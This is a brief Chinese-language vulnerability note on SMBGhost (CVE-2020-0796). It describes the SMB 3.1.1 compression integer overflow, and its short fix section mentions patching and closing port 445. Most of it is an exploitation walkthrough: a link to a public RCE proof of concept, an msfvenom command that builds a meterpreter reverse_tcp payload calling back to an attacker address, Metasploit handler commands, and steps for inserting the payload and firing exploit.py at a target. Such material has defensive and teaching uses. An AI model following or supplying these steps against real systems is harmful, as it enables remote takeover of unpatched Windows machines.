### 一 漏洞描述
smbghost远程命令执行(CVE-2020-0796) 永恒之黑  

SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。  
漏洞发生在srv2.sys中,由于SMB没有正确处理压缩的数据包,在解压数据包的时候使用客户端传过来的长度进行解压时,并没有检查长度是否合法.最终导致整数溢出。

### 二 漏洞利用
exploit  
https://github.com/chompie1337/SMBGhost_RCE_PoC

1 msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.140 LPORT=6666 -f python -o shell.txt
等待成功后，会生成一个shell.txt文件  
2 msf监听
```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 本地机器IP
msf5 exploit(multi/handler) > set lport 本地监听端口
msf5 exploit(multi/handler) > run
```
3 把shell.txt文件里的buf替换成USER_PAYLOAD，然后打开exploit.py文件，替换其中的USER_PAYLOAD  
4 执行exploit
`python3 exploit.py -ip 目标机器`

### 三 漏洞修复
1 打补丁  
2 关闭445



> 参考链接  
> 分析介绍: https://blog.csdn.net/Adminxe/article/details/105917952  
> 利用方式: https://cloud.tencent.com/developer/article/1944702  
> exploit: https://github.com/chompie1337/SMBGhost_RCE_PoC
